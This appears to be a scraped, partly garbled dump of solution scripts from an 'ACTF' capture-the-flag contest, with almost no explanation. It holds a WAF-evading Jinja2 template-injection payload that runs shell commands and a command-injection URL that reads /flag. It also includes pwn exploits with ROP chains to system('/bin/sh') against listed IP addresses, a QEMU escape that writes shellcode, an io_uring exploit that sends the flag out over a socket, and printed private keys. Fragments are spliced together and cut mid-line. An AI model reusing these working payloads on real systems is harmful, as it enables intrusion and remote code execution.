dict(glo=aa,bals=bb)|join %}{% set itm = dict(ite=aa,ms=bb)|join %}{% set pld = xhx~xhx~imp~xhx~xhx~left~yin~so~yin~right~point~pon~left~yin~ca~space~flg~yin~right~point~red~left~right %}{% for f,v in (self|attr(xhx~xhx~ini~xhx~xhx)|attr(xhx~xhx~glo~xhx~xhx)|attr(itm))() %}{% if f == bul %}{% for a,b in (v|attr(itm))() %}{% if a == ev %}{{b(pld)}}{% endif %}{% endfor %}{% endif %}{% endfor %}'
res = session.post(url+'write',json={"story":
payload})print(res.text)res = session.get(url+'story')print("result:")print(res.text)

import random
rule = [ ['\x','[',']','.','getitem','print','request','args','cookies','values','getattribute','config'], # rule 1 ['(',']','getitem','_','%','print','config','args','values','|',''','"','dict',',','join','.','set'], # rule 2 [''','"','dict',',','config','join','\x',')','[',']','attr','__','list','globals','.'], # rule 3 ['[',')','getitem','request','.','|','config','popen','dict','doc','\x','_','{{','mro'], # rule 4 ['\x','(',')','config','args','cookies','values','[',']','{{','.','request','|','attr'], # rule 5 ['print', 'class', 'import', 'eval', '__', 'request','args','cookies','values','|','\x','getitem'] # rule 6]
# Make waf more random
def transfrom(number): a = random.randint(0,20) b = random.randint(0,100) return (a * number + b) % 6
def singel_waf(input, rules): input = input.lower() for rule in rules: if rule in input: return False return True
def minic_waf(input): waf_seq = random.sample(range(21),3) result_2 = None result_1 = None result_3 = None for index in range(len(waf_seq)): waf_seq[index] = transfrom(waf_seq[index]) if index == 0: result_1 = rule[waf_seq[index]] elif index == 1: result_2 = rule[waf_seq[index]] else: result_3 = rule[waf_seq[index]] if(result_1==result_2 ==result_3==['\x','[',']','.','getitem','print','request','args','cookies','values','getattribute','config']): print(result_3) return '1' if not singel_waf(input, rule[waf_seq[index]]): return False return True

{% set zero = (self|int) %}{% set one = (zero**zero)|int %}{% set two = (zero-one-one)|abs %}{% set four = (two*two)|int %}{% set five = (two*two*two)-one-one-one %}{% set three = five-one-one %}{% set nine = (two*two*two*two-five-one-one) %}{% set seven = (zero-one-one-five)|abs %}{% set space = self|string|min %}{% set point = self|float|string|min %}{% set c = dict(c=aa)|reverse|first %}{% set bfh = self|string|urlencode|first %}{% set bfhc = bfh~c %}{% set slas = bfhc%((four~seven)|int) %}{% set yin = bfhc%((three~nine)|int) %}{% set xhx = bfhc%((nine~five)|int) %}{% set right = bfhc%((four~one)|int) %}{% set left = bfhc%((four~zero)|int) %}{% set but = dict(buil=aa,tins=dd)|join %}{% set imp = dict(imp=aa,ort=dd)|join %}{% set pon = dict(po=aa,pen=dd)|join %}{% set so = dict(o=aa,s=dd)|join %}{% set ca = dict(ca=aa,t=dd)|join %}{% set flg = dict(fl=aa,ag=dd)|join %}{% set ev = dict(ev=aa,al=dd)|join %}{% set red = dict(re=aa,ad=dd)|join %}{% set bul = xhx~xhx~but~xhx~xhx %}{% set ini = dict(ini=aa,t=bb)|join %}{% set glo = dict(glo=aa,bals=bb)|join %}{% set itm = dict(ite=aa,ms=bb)|join %}{% set pld = xhx~xhx~imp~xhx~xhx~left~yin~so~yin~right~point~pon~left~yin~ca~space~flg~yin~right~point~red~left~right %}{% for f,v in (self|attr(xhx~xhx~ini~xhx~xhx)|attr(xhx~xhx~glo~xhx~xhx)|attr(itm))() %}{% if f == bul %}{% for a,b in (v|attr(itm))() %}{% if a == ev %}{{b(pld)}}{% endif %}{% endfor %}{% endif %}{% endfor %}

import requestsimport timeimport randomfrom utils.captcha import Captchafrom utils.testminic import *
def generate_code(length: int = 4,z=0): characters = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz' return ''.join(random.choice(characters) for _ in range(length))
url = 'http://124.70.33.170:
23001/'url = 'http://127.0.0.1:
5000/'

while True: now = int(time.time()) session = requests.session() all = 0 payload = '123' res = session.get(url+'captcha') for i in range(1,100): gen = Captcha(200, 80,now+i) buf , captcha_text = gen.generate() if(buf.getvalue()==res.content): print(now+i) seed = now+i print('success') gen = Captcha(200, 80,seed) buf , captcha_text = gen.generate() code = generate_code() minic_waf(payload)
 x = 0 while True: x+=1 if minic_waf(payload) == '1': print(x) break if(x>10): print("more than 10") time.sleep(1) break print("x_all:"+str(x)) res = session.post(url+'vip',json={"captcha":
code}) print(res.cookies) print("a") res = session.post(url+'write',json={"story":
payload}) print(res.text) error = [] for i in range(x-1): res = session.post(url+'write',json={"story":
payload})
 print(i) payload = '{% set zero = (self|int) %}{% set one = (zero**zero)|int %}{% set two = (zero-one-one)|abs %}{% set four = (two*two)|int %}{% set five = (two*two*two)-one-one-one %}{% set three = five-one-one %}{% set nine = (two*two*two*two-five-one-one) %}{% set seven = (zero-one-one-five)|abs %}{% set space = self|string|min %}{% set point = self|float|string|min %}{% set c = dict(c=aa)|reverse|first %}{% set bfh = self|string|urlencode|first %}{% set bfhc = bfh~c %}{% set slas = bfhc%((four~seven)|int) %}{% set yin = bfhc%((three~nine)|int) %}{% set xhx = bfhc%((nine~five)|int) %}{% set right = bfhc%((four~one)|int) %}{% set left = bfhc%((four~zero)|int) %}{% set but = dict(buil=aa,tins=dd)|join %}{% set imp = dict(imp=aa,ort=dd)|join %}{% set pon = dict(po=aa,pen=dd)|join %}{% set so = dict(o=aa,s=dd)|join %}{% set ca = dict(ca=aa,t=dd)|join %}{% set flg = dict(fl=aa,ag=dd)|join %}{% set ev = dict(ev=aa,al=dd)|join %}{% set red = dict(re=aa,ad=dd)|join %}{% set bul = xhx~xhx~but~xhx~xhx %}{% set ini = dict(ini=aa,t=bb)|join %}{% set glo = dict(glo=aa,bals=bb)|join %}{% set itm = dict(ite=aa,ms=bb)|join %}{% set pld = xhx~xhx~imp~xhx~xhx~left~yin~so~yin~right~point~pon~left~yin~ca~space~flg~yin~right~point~red~left~right %}{% for f,v in (self|attr(xhx~xhx~ini~xhx~xhx)|attr(xhx~xhx~glo~xhx~xhx)|attr(itm))() %}{% if f == bul %}{% for a,b in (v|attr(itm))() %}{% if a == ev %}{{b(pld)}}{% endif %}{% endfor %}{% endif %}{% endfor %}' res = session.post(url+'write',json={"story":
payload}) print(res.text) res = session.get(url+'story') print("result:") print(res.text) if('ACTF' in res.text): exit(0)

import random
rule = [ ['\x','[',']','.','getitem','print','request','args','cookies','values','getattribute','config'], # rule 1 ['(',']','getitem','_','%','print','config','args','values','|',''','"','dict',',','join','.','set'], # rule 2 [''','"','dict',',','config','join','\x',')','[',']','attr','__','list','globals','.'], # rule 3 ['[',')','getitem','request','.','|','config','popen','dict','doc','\x','_','{{','mro'], # rule 4 ['\x','(',')','config','args','cookies','values','[',']','{{','.','request','|','attr'], # rule 5 ['print', 'class', 'import', 'eval', '__', 'request','args','cookies','values','|','\x','getitem'] # rule 6]
# Make waf more random
def transfrom(number): a = random.randint(0,20) b = random.randint(0,100) return (a * number + b) % 6
def singel_waf(input, rules): input = input.lower() for rule in rules: if rule in input: return False return True
def minic_waf(input): waf_seq = random.sample(range(21),3) result_2 = None result_1 = None result_3 = None for index in range(len(waf_seq)): waf_seq[index] = transfrom(waf_seq[index]) if index == 0: result_1 = rule[waf_seq[index]] elif index == 1: result_2 = rule[waf_seq[index]] else: result_3 = rule[waf_seq[index]] if(result_1==result_2 ==result_3==['\x','[',']','.','getitem','print','request','args','cookies','values','getattribute','config']): print(result_3) return '1' if not singel_waf(input, rule[waf_seq[index]]): return False return True

http://124.70.33.170:
24000/checker?url=-iL%20/flag%20public/index.html%20127.0.0.1


```
import struct
from claripy import *
enc_flag = [ 0xABA29EC2A98DD89A, 0xBBF1B4AB81B4A9D4, 0xFB92A48DB386FFA8, 0xEFB491B8AFB4ABD3, 0x80EF69F1CBD00397, 0xB2EB07859CDA52D3, 0xEC9E22F5A5A07FA3, 0x4B36DF7B5B655A84,]
_enc_flag = struct.pack('<8Q', *enc_flag)buf = bytearray(_enc_flag)unk = bytearray(struct.pack(' ', payload)sd(img)
payload = b'.COMLEN:
256'payload += b'.OP:
ECHO'payload += b'.FLASHSZ:0'payload = payload.ljust(0x100, b'.')sa(b'> ', payload)
ia()
# '/data/flag' ACTF{REv3rsE_2_bE_A_fLAshH4cK3r_c001}
from pwn import *context.log_level = 'ERROR'

def gen_payload(old, new): old = p64(old) new = p64(new) payload = '' for i in range(8): v = new[i]-old[i] if v == 0: payload += 'd' elif v > 0: payload += f'{v}wd' else: # old[i] < new[i] payload += f'{-v}sd' payload += '8a' return payload

# print(gen_payload(0x11, 0x12))
# exit()

def exploit(op): p.sendlineafter(b'n> ', op.encode()) return u64(p.recvn(8))

def exploit2(op): p.sendlineafter(b'n> ', op.encode()) res = p.recvuntil(b'n> ', True) p.unrecv(b'n> ') # print(hexdump(res, total=False)) _res = res if len(res) != 8: _res = b'' for i in range(len(res)-3): if res[i] == 0x5b and res[i+2] == 0x5d: _res = bytes([res[i+1]])+res[i+3:] break print(hexdump(_res, total=False)) if len(_res) < 8: _res = _res.ljust(8, b'#') assert len(_res) == 8 return _res

_data = b''stack_data = []p = remote('120.46.65.156', 32104)p.recvuntil(b'submit.')
exploit2(gen_payload(u64(b'Aaaaaaax00'), u64(b'/bin/sh'.ljust(8, b'x00'))))
# 8d8sres = exploit('8d8w')buf_base = res - 8stack_data.append(res)_data += p64(res)assert (0x100-(buf_base & 0xFF)) >= 0x30

res = exploit('8a8w8d')stack_data.append(res)_data += p64(res)
leak_counts = 4exploit('8a')for i in range(leak_counts): res = exploit('8a8w') stack_data.append(res) _data += p64(res)
for i in range(len(stack_data)): print(f'{i*8:
02X}', hex(stack_data[i]))
elf_base = stack_data[1]-0x1580 # size 0x5000libc_base = stack_data[2]-0x23d0a # __libc_start_main_ret
ptr_addr = stack_data[0]buf_addr = stack_data[0]-8print('buf_addr:', hex(buf_addr))print('elf_base:', hex(elf_base))print('libc+bbb:', hex(stack_data[2]))for i in range(leak_counts): exploit('8d')
v = 8+(leak_counts)*8exploit2(f'{v}a{v}s{v}d')
exploit2('8d') # skip &rbp
rop_data = [ elf_base+0x15DB, # pop rdi|ret buf_addr, elf_base+0x15DC, # ret libc_base+0x45e50 # system]for i in range(len(rop_data)): exploit2('8d') exploit2(gen_payload(stack_data[2+i], rop_data[i]))
p.sendlineafter(b'n> ', b'')print(p.clean(1))
p.interactive()
    #include <stdio.h>#include #include <stdlib.h>#include <stdint.h>#include <string.h>#include <errno.h>#include <signal.h>#include <fcntl.h>#include <ctype.h>#include <termios.h>#include <assert.h>
    #include <sys/types.h>#include <sys/mman.h>#include <sys/io.h>
char *mmio_pci_device_name = "/sys/devices/pci0000:00/0000:00:04.0/resource0";
unsigned int pmio_base = 0xc040;
unsigned char *mmio_base;
int open_mem_io(const char *pci_device_name){
 int fd = -1; if ((fd = open(pci_device_name, O_RDWR | O_SYNC)) == -1) { perror("open pci device"); exit(-1); } return fd;}
// /sys/devices/pci0000:00/0000:00:04.0/resourceunsigned char *get_mem_io_base(const char *pci_device_name, uint64_t addr, int size){
 int fd; fd = open_mem_io(pci_device_name);
 unsigned char *base = mmap((void *)addr, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0); if (base == (void *)-1) { perror("mmap"); exit(-1); } return base;}
void mmio_write(uint64_t addr, uint32_t value){ *((uint32_t *)(mmio_base + addr)) = value;}
uint32_t mmio_read(uint64_t addr){ return *((uint32_t *)(mmio_base + addr));}
const char *flag = "ACTF{cH3cK_1n_wI7h_B@by_C1ph3r_Te$t_1n_Q3MU_pl4yg3OuNd_1$_EASy!}";
// heap+4GBuint64_t leak_u64(uint64_t addr){ uint64_t v = 0; mmio_write(0x40, addr & 0xFFFFFFFF); uint32_t ll = (uint32_t)inl(pmio_base + 0x10); mmio_write(0x40, (addr + 4) & 0xFFFFFFFF); uint32_t lh = (uint32_t)inl(pmio_base + 0x10); v = (uint64_t)lh << 32 | ll; return v;}// heap+4GBvoid write_u64(uint64_t addr, uint64_t v){ mmio_write(0x40, addr & 0xFFFFFFFF); outl(v & 0xFFFFFFFF, pmio_base + 0x10);
 mmio_write(0x40, (addr + 4) & 0xFFFFFFFF); outl(v >> 32, pmio_base + 0x10);}
// lspciint main(int argc, char const *argv[]){ int i = 0; mmio_base = get_mem_io_base(mmio_pci_device_name, 0xfebf1000, 0x1000); printf("mmio_base Resource0 Base: %pn", mmio_base);
 if (iopl(3) != 0) { perror("I/O permission is not enoughn"); exit(1); }
 int already_logged = 0; int logged = inb(pmio_base + 1); if (!logged) { for (int i = 0; i < 64; i += 4) { mmio_write(i, *(uint32_t *)&flag[i]); } outb(1, pmio_base + 1); for (int i = 0; i < 100; i++) { logged = inb(pmio_base + 1); } } else { printf("already logged!n"); already_logged = 1; } printf("login %dn", logged); if (logged) { // g_malloc(32) if (!already_logged) { outl(0x31323334, pmio_base + 0x10); }
 uint32_t leak = mmio_read(0x40); printf("leak %08Xn", leak); uint64_t addr = leak;
 // 覆盖ptr低地址 mmio_write(0x40, leak + 4); uint32_t leak2 = (uint32_t)inl(pmio_base + 0x10); printf("leak2 %08Xn", leak2); addr = (uint64_t)leak2 << 32 | leak; printf("0x%016llxn", addr); //-0x865b0 uint64_t heap_base = addr & ~0xFFFFFF; printf("heap_base %016llxn", heap_base);
 uint64_t leak_elf = leak_u64(heap_base + 0x000e28) - 0xa23d4f; printf("qemu-system-x86_64 base: 0x%016llxn", leak_elf);
 uint64_t heap_size = leak_u64(heap_base + 0x10); printf("heap_size %016llxn", heap_size);
 // 0xf7db000 remote // 0xd41d000 local uint64_t start_off = 0xFF1D000; // printf("test base: 0x%016llxn", heap_base + start_off); uint64_t shellcode = 0; for (int i = 0; i < 0x20000; i++) { uint64_t _addr = heap_base + start_off - i * 0x1000; // printf("test %016llx: n", _addr-heap_base); if (leak_u64(_addr) == 0x5641554154415355) { shellcode = _addr; printf("shellcode %016llx: %016llxn", shellcode, leak_u64(_addr)); break; } } if (!shellcode) { puts("no! shellcode"); exit(1); } // cat ./flag unsigned char hexData[56] = { 0x48, 0xB8, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x50, 0x48, 0xB8, 0x2F, 0x2E, 0x67, 0x6D, 0x60, 0x66, 0x01, 0x01, 0x48, 0x31, 0x04, 0x24, 0x6A, 0x02, 0x58, 0x48, 0x89, 0xE7, 0x31, 0xF6, 0x0F, 0x05, 0x41, 0xBA, 0xFF, 0xFF, 0xFF, 0x7F, 0x48, 0x89, 0xC6, 0x6A, 0x28, 0x58, 0x6A, 0x01, 0x5F, 0x99, 0x0F, 0x05, 0x90, 0x90, 0x90}; // shellcode 16be2000 // + 16be0000
 for (int i = 0; i < sizeof(hexData); i += 8) { write_u64(shellcode + 0x16be0000 + i, *(uint64_t *)&hexData[i]); } // 这个区域的执行频率太高了 5字节的跳转写到一半就蹦了 垫个短跳 unsigned char jmp_code[8] = { 0xE9, 0x00, 0x00, 0x00, 0x00, 0x90, 0x90, 0x90};
 *(uint32_t *)&jmp_code[1] = 0x16be0000 - 0x2D - 5; write_u64(shellcode + 0x2D, *(uint64_t *)&jmp_code[0]);
 unsigned char shortjmp_code[8] = { 0xEB, 0x2B, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90}; write_u64(shellcode + 0, *(uint64_t *)&shortjmp_code[0]); } return 0;}// ACTF{7ry_b4by_q3mu_ch@1leng3_4nd_g3t_b@by_f1ag}
Wish you a good journey line CODE JT JF K================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x00 0x19 0xc000003e if (A != ARCH_X86_64) goto 0027 0002: 0x20 0x00 0x00 0x00000000 A = sys_number 0003: 0x35 0x00 0x01 0x40000000 if (A < 0x40000000) goto 0005 0004: 0x15 0x00 0x16 0xffffffff if (A != 0xffffffff) goto 0027 0005: 0x15 0x15 0x00 0x00000000 if (A == read) goto 0027 0006: 0x15 0x14 0x00 0x00000001 if (A == write) goto 0027 0007: 0x15 0x13 0x00 0x00000002 if (A == open) goto 0027 0008: 0x15 0x12 0x00 0x00000011 if (A == pread64) goto 0027 0009: 0x15 0x11 0x00 0x00000012 if (A == pwrite64) goto 0027 0010: 0x15 0x10 0x00 0x00000013 if (A == readv) goto 0027 0011: 0x15 0x0f 0x00 0x00000014 if (A == writev) goto 0027 0012: 0x15 0x0e 0x00 0x00000028 if (A == sendfile) goto 0027 0013: 0x15 0x0d 0x00 0x0000002c if (A == sendto) goto 0027 0014: 0x15 0x0c 0x00 0x0000002e if (A == sendmsg) goto 0027 0015: 0x15 0x0b 0x00 0x0000003b if (A == execve) goto 0027 0016: 0x15 0x0a 0x00 0x00000101 if (A == openat) goto 0027 0017: 0x15 0x09 0x00 0x00000127 if (A == preadv) goto 0027 0018: 0x15 0x08 0x00 0x00000128 if (A == pwritev) goto 0027 0019: 0x15 0x07 0x00 0x0000012f if (A == name_to_handle_at) goto 0027 0020: 0x15 0x06 0x00 0x00000130 if (A == open_by_handle_at) goto 0027 0021: 0x15 0x05 0x00 0x00000142 if (A == execveat) goto 0027 0022: 0x15 0x04 0x00 0x00000147 if (A == preadv2) goto 0027 0023: 0x15 0x03 0x00 0x00000148 if (A == pwritev2) goto 0027 0024: 0x15 0x02 0x00 0x000001ac if (A == 0x1ac) goto 0027 0025: 0x15 0x01 0x00 0x000001b5 if (A == 0x1b5) goto 0027 0026: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0027: 0x06 0x00 0x00 0x00000000 return KILL
//filename:
fxxk.c//gcc -o fxxk -static -fno-stack-protector -no-pie -O3 ./fxxk.c -luring
    #include <assert.h>#include <fcntl.h>#include <liburing.h>#include <stdio.h>#include <stdlib.h>#include #include <sys/socket.h>#include <netinet/in.h>
struct mmsghdr { struct msghdr msg_hdr; /* Actual message header. */ unsigned int msg_len; /* Number of received or sent bytes for the entry. */ };
static inline long __syscall6(long n, long a1, long a2, long a3, long a4, long a5, long a6){ unsigned long ret; register long r10 __asm__("r10") = a4; register long r8 __asm__("r8") = a5; register long r9 __asm__("r9") = a6; __asm__ __volatile__ ("syscall" : "=a"(ret) : "a"(n), "D"(a1), "S"(a2), "d"(a3), "r"(r10), "r"(r8), "r"(r9) : "rcx", "r11", "memory"); return ret;}
int main(void) { struct io_uring_cqe *cqe; struct io_uring_sqe *sqe; struct io_uring ring; char *send_buff;
 io_uring_queue_init(16, &ring, 0); sqe = io_uring_get_sqe(&ring); io_uring_prep_openat(sqe, AT_FDCWD, "flag", O_RDONLY, 0); io_uring_submit(&ring); io_uring_wait_cqe(&ring, &cqe); //flag_fd -> (int)cqe->res send_buff = __syscall6(9,0,0x1000,7,2,(int)cqe->res,0);
 struct mmsghdr msg; struct iovec iov; iov.iov_base = send_buff; iov.iov_len = 0x50;
 msg.msg_hdr.msg_name = 0; msg.msg_hdr.msg_namelen =0; msg.msg_hdr.msg_iov = &iov; msg.msg_hdr.msg_iovlen = 1; msg.msg_hdr.msg_control = NULL; msg.msg_hdr.msg_controllen = 0; msg.msg_hdr.msg_flags = 0; sendmmsg(4, &msg, 1, 0); /* ACTF{D0_u_kNow_7h@T_1o_u3InG_c4n_θrw_ToO0o0OoO?} */
 return 0;}
#!/usr/bin/env python3'''Author:
7resp4ssDate:
2023-10-27 19:45:
05Usage: Debug : python3 exp.py debug elf-file-path -t -b malloc Remote: python3 exp.py remote elf-file-path ip:
port'''
from pwncli import *cli_script()

io: tube = gift.ioelf: ELF = gift.elflibc: ELF = gift.libc
filename = gift.filename # current filenameis_debug = gift.debug # is debug or not is_remote = gift.remote # is remote or notgdb_pid = gift.gdb_pid # gdb pid if debug

file_size = 0x4c5000-0x400000sc = asm(shellcraft.amd64.linux.syscall('SYS_memfd_create','rsp',7))
sc+= asm(shellcraft.amd64.linux.syscall('SYS_mmap', 0x400000, file_size+0x15000,'PROT_READ | PROT_WRITE | PROT_EXEC','MAP_PRIVATE | MAP_ANONYMOUS',3, 0))pd = generate_payload_for_connect("127.0.0.1",9999)sc+= asm(shellcraft.amd64.linux.syscall('SYS_socket',2,1,0))sc+= asm(shellcraft.pushstr(pd))sc+= asm(shellcraft.amd64.linux.syscall('SYS_connect',4,'rsp',0x10))
cyc_recv = ''' mov r12,0x400000recv: mov rdi,4 mov rsi,r12 mov rdx,0x50000 mov rax,45 xor r10,r10 xor r8,r8 syscall add r12,rax test rax,rax js fini jmp recv

fini: push 0x401E05 ret'''

sc+= asm(cyc_recv)

sla('code',sc)
ia()
cat ./fxxk | nc -l 9999 > recv_flag
./exp.py de ./master-of-orw
cat ./fxxk | nc -lvnp 9999 > recv_flag
c = 63442255298812942222810837512019302954917822996915527697525497640413662503768308023517128481053593562877494934841788054865410798751447333551319775025362132176942795107214528962480350398519459474033659025815248579631003928932688495682277210240277909527931445899728273182691941548330126199931886748296031014210795428593631253184315074234352536885430181103986084755140024577780815130067722355861473639612699372152970688687877075365330095265612016350599320999156644e = 272785315258275494478303901715994595013215169713087273945370833673873860340153367010424559026764907254821416435761617347240970711252213646287464416524071944646705551816941437389777294159359383356817408302841561284559712640940354294840597133394851851877857751302209309529938795265777557840238332937938235024502686737802184255165075195042860413556866222562167425361146312096189555572705076252573222261842045286782816083933952875990572937346408235562417656218440227n1 = 473173031410877037287927970398347001343136400938581274026578368211539730987889738033351265663756061524526288423355193643110804217683860550767181983527932872361546531994961481442866335447011683462904976896894011884907968495626837219900141842587071512040734664898328709989285205714628355052565784162841441867556282849760230635164284802614010844226671736675222842060257156860013384955769045790763119616939897544697150710631300004180868397245728064351907334273953201n2 = 327163771871802208683424470007561712270872666244394076667663345333853591836596054597471607916850284565474732679392694515656845653581599800514388800663813830528483334021178531162556250468743461443904645773493383915711571062775922446922917130005772040139744330987272549252540089872170217864935146429898458644025927741607569303966038195226388964722300472005107075179204987774627759625183739199425329481632596633992804636690274844290983438078815836605603147141262181n3 = 442893163857502334109676162774199722362644200933618691728267162172376730137502879609506615568680508257973678725536472848428042122350184530077765734033425406055810373669798840851851090476687785235612051747082232947418290952863499263547598032467577778461061567081620676910480684540883879257518083587862219344609851852177109722186714811329766477552794034774928983660538381764930765795290189612024799300768559485810526074992569676241537503405494203262336327709010421

M=Matrix(ZZ,4,7)
M[0,0]=n1M[3,0]=eM[1,1]=n2M[3,1]=eM[2,2]=n3M[3,2]=eM[0,3]=2^768M[1,4]=2^768M[2,5]=2^768M[3,6]=2^768
mm = M.LLL()print(mm[0])
d=int(mm[0][-1])//2^768d=int(d)m=pow(c,d,n1)from Crypto.Util.number import *print(long_to_bytes(m))#b'ACTF{5FFC427B-F14F-DCA0-C425-675B149890C2}'
from hashlib import sha256from Crypto.Util.number import *with open ('output.txt') as f: exec(f.read())r = 128c = 96p = 308955606868885551120230861462612873078105583047156930179459717798715109629AA=matrix(Zmod(p),A)BB=matrix(Zmod(p),B)shared = (AA.T*BB).trace()print('shared=',shared)flag=int(sha256(str(int(shared)).encode()).hexdigest(), 16)^^encprint(long_to_bytes(flag))
shared= 229215835499100713048005195047655740191791862411327976508820034350300131774b'ACTF{do_you_know_f0rm2l1n_1s_4w3s0m3!}'
from pwn import remote
from tqdm import tqdm
from os import system

def once(): rn = remote('ip', 'port') with tqdm(range(256), desc='score=0, expect=0') as bar: score = 0 for i in bar: if score >= 2220: print(rn.recvline().decode()) rn.interactive() break if score < 2220 - (256 - i) * 8.83 and 16 < i < 160: # 剪枝 break
 # 抓娃娃 pos = rn.recvline_startswith(b'i am at ').decode() x, y = map(int, pos.split('[')[-1].split(']')[0].split(',')) rn.sendlineafter(b'Your moves: ', b'S' * 15 + b'A' * 15 + b'D' * x + b'W' * y) assert rn.recvline().decode() == f'{x} {y}n'
 # 随机落夹 chaos = rn.recvline_startswith(b'choas:').decode() chaos = int(chaos.split()[-1]) p = int(bin(chaos)[3:-65], 2) q = 1 << 63 delta = abs(chaos*q - p*pow(2,128)) poss = bin(delta)[2:].count('0') / len(bin(delta)[2:]) rn.sendlineafter(b'): ', f'{p},{q}'.encode())
 # 更新分数 score = rn.recvline_startswith(b'your score: ').decode() score = int(score.split(' ')[-1]) bar.desc = f'score={score}, expect={score/(i+1)*256:.2f}, poss={poss:.3f}' rn.close()
while True: once()
# ACTF{C0Nt1nu3d_Fract1on&Mor3_zer0s&Replay_it}
java -cp "apps/*:
lib/*:
conf/" org.fisco.bcos.sdk.demo.amop.tool.AmopSubscriber flag1Start testStep 2:
Receive msg, time: 2023-10-28 14:38:
58topic:
flag1 content:
ACTF{Con5oR7ium_B1ock_
2665bf1dcd6ec3c77f769d1299c2a2ffe616964a81b634c932914ce92d4c2dd7
openssl ecparam -name secp256k1 -genkey -out secp256k1-priv.pem
charon@root:~/Desktop$ openssl pkey -in secp256k1-priv.pem -text-----BEGIN PRIVATE KEY-----MIGEAgEAMBAGByqGSM49AgEGBSuBBAAKBG0wawIBAQQgH1iMXflR1JXdgq4IgIumGC5Q92xJ75UdSzn0t4ARtXWhRANCAARi4WBZ94dv+BQiU/httvye3aaRKPNkA2wvatETOlrfbVMHgdRribhGNEu/zK1FdztkawQ+iB27VqdIjG0ReMiR-----END PRIVATE KEY-----Private-Key: (256 bit)priv: 1f:58:8c:5d:f9:51:d4:95:dd:82:ae:08:80:8b:a6: 18:2e:50:f7:6c:49:ef:95:1d:4b:39:f4:b7:80:11: b5:
75pub: 04:62:e1:60:59:f7:87:6f:f8:14:22:53:f8:6d:b6: fc:9e:dd:a6:91:28:f3:64:03:6c:2f:6a:d1:13:3a: 5a:df:6d:53:07:81:d4:6b:89:b8:46:34:4b:bf:cc: ad:45:77:3b:64:6b:04:3e:88:1d:bb:56:a7:48:8c: 6d:11:78:c8:
91ASN1 OID: secp256k1charon@root:~/Desktop$ more secp256k1-priv.pem -----BEGIN EC PRIVATE KEY-----MHQCAQEEIB9YjF35UdSV3YKuCICLphguUPdsSe+VHUs59LeAEbV1oAcGBSuBBAAKoUQDQgAEYuFgWfeHb/gUIlP4bbb8nt2mkSjzZANsL2rREzpa321TB4HUa4m4RjRLv8ytRXc7ZGsEPogdu1anSIxtEXjIkQ==-----END EC PRIVATE KEY-----
b='MIGEAgEAMBAGByqGSM49AgEGBSuBBAAKBG0wawIBAQQg8hViqWbBo5plQehiI5LCw7ybwdZ0L3Rlebkghl53rs2hRANCAAT3y+X8MRoE+u3VVJsfPbVdeR2WKHYtIg1FKSLumVtrekXthxAZFJ8Dq1EjsBaAbskJzai1Db24a/FD2dyrfw6G'print(base64.b64decode(b).hex())
# 308184020100301006072a8648ce3d020106052b8104000a046d306b0201010420f21562a966c1a39a6541e8622392c2c3bc9bc1d6742f746579b920865e77aecda14403420004f7cbe5fc311a04faedd5549b1f3db55d791d9628762d220d452922ee995b6b7a45ed871019149f03ab5123b016806ec909cda8b50dbdb86bf143d9dcab7f0e86
charon@root:~/Desktop$ openssl pkey -in secp256k1-priv.pem -text-----BEGIN PRIVATE KEY-----MIGEAgEAMBAGByqGSM49AgEGBSuBBAAKBG0wawIBAQQg8hViqWbBo5plQehiI5LCw7ybwdZ0L3Rlebkghl53rs2hRANCAAT3y+X8MRoE+u3VVJsfPbVdeR2WKHYtIg1FKSLumVtrekXthxAZFJ8Dq1EjsBaAbskJzai1Db24a/FD2dyrfw6G-----END PRIVATE KEY-----Private-Key: (256 bit)priv: f2:15:62:a9:66:c1:a3:9a:65:41:e8:62:23:92:c2: c3:bc:9b:c1:d6:74:2f:74:65:79:b9:20:86:5e:77: ae:
cdpub: 04:f7:cb:e5:fc:31:1a:04:fa:ed:d5:54:9b:1f:3d: b5:5d:79:1d:96:28:76:2d:22:0d:45:29:22:ee:99: 5b:6b:7a:45:ed:87:10:19:14:9f:03:ab:51:23:b0: 16:80:6e:c9:09:cd:a8:b5:0d:bd:b8:6b:f1:43:d9: dc:ab:7f:0e:
86ASN1 OID: secp256k1
#308184020100301006072a8648ce3d020106052b8104000a046d306b0201010420f21562a966c1a39a6541e8622392c2c3bc9bc1d6742f746579b920865e77aecd a14403420004f7cbe5fc311a04faedd5549b1f3db55d791d9628762d220d452922ee995b6b7a45ed871019149f03ab5123b016806ec909cda8b50dbdb86bf143d9dcab7f0e86
charon@root:~/Desktop$ openssl pkey -in secp256k1-priv.pem -text-----BEGIN PRIVATE KEY-----MIGEAgEAMBAGByqGSM49AgEGBSuBBAAKBG0wawIBAQQgH1iMXflR1JXdgq4IgIumGC5Q92xJ75UdSzn0t4ARtXWhRANCAARi4WBZ94dv+BQiU/httvye3aaRKPNkA2wvatETOlrfbVMHgdRribhGNEu/zK1FdztkawQ+iB27VqdIjG0ReMiR-----END PRIVATE KEY-----Private-Key: (256 bit)priv: 1f:58:8c:5d:f9:51:d4:95:dd:82:ae:08:80:8b:a6: 18:2e:50:f7:6c:49:ef:95:1d:4b:39:f4:b7:80:11: b5:
75pub: 04:62:e1:60:59:f7:87:6f:f8:14:22:53:f8:6d:b6: fc:9e:dd:a6:91:28:f3:64:03:6c:2f:6a:d1:13:3a: 5a:df:6d:53:07:81:d4:6b:89:b8:46:34:4b:bf:cc: ad:45:77:3b:64:6b:04:3e:88:1d:bb:56:a7:48:8c: 6d:11:78:c8:
91ASN1 OID: secp256k1
# 308184020100301006072a8648ce3d020106052b8104000a046d306b02010104201f588c5df951d495dd82ae08808ba6182e50f76c49ef951d4b39f4b78011b575 a1440342000462e16059f7876ff8142253f86db6fc9edda69128f364036c2f6ad1133a5adf6d530781d46b89b846344bbfccad45773b646b043e881dbb56a7488c6d1178c891
